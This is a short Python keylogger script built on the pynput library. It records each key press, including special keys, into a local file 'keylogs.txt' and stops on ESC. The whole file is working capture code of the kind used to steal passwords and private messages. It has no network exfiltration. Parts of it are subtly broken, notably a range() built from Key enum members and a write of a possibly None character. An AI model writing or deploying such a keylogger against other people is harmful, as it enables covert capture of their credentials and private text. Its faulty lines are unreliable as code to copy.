from pynput.keyboard import Listener, Key
def on_press(key, f):
    """Handle key press events and write to a file."""
    try:
        if hasattr(key, 'char'):
            f.write(key.char)
        elif key == Key.enter:
            f.write('[ENTER]')
        elif key == Key.space:
            f.write('[SPACE]')
        elif key == Key.tab:
            f.write('[TAB]')
        elif key == Key.backspace:
            f.write('[BACKSPACE]')
        elif key in [Key.up, Key.down, Key.left, Key.right]:
            f.write(f'[{key.name.upper()}]')
        elif key in range(Key.f1, Key.f13):
            f.write(f'[{key.name.upper()}]')
        elif key == Key.esc:
            return False
        else:
            f.write(f'[UNRECOGNIZED: {key}]')
    except Exception as e:
        print(f'Error writing to file: {e}')
def main():
    """
    Set up the listener and manage the keylogging process.

    This function sets up a Listener to capture keyboard inputs,
    writes the captured keystrokes to 'keylogs.txt', and stops
    when the ESC key is pressed. It handles regular characters,
    special keys like arrow keys, F1-F12, ENTER, SPACE, TAB,
    BACKSPACE, and logs them in a structured format.
    """
    try:
        with open('keylogs.txt', 'a') as f:
            try:
                with Listener(on_press=lambda key: on_press(key, f)) as listener:
                    listener.join()
            except Exception as e:
                print(f'Error in setting up the listener: {e}')
    except Exception as e:
        print(f'Error opening file: {e}')
if __name__ == '__main__':
    main()
